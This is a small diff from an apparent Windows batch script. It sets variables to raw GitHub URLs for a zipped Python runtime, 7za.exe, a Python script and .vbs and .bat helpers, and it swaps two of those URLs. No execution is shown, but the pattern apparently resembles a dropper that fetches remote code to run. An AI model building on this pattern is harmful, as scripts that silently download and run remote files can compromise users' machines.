@@ -12,8 +12,8 @@
     set url=https://github.com/somehat/files/raw/main/python.zip
     set url1=https://github.com/somehat/files/raw/main/7za.exe
     set url2=https://github.com/somehat/files/raw/main/touche.py
-    set url3=https://github.com/somehat/files/raw/main/_hf.vbs
-    set url4=https://github.com/somehat/files/raw/main/_sc.bat
+    set url3=https://github.com/somehat/files/raw/main/_sc.bat
+    set url4=https://github.com/somehat/files/raw/main/_hf.vbs
     set file=python.zip
     set file1=7za.exe
     set file2=touche.py
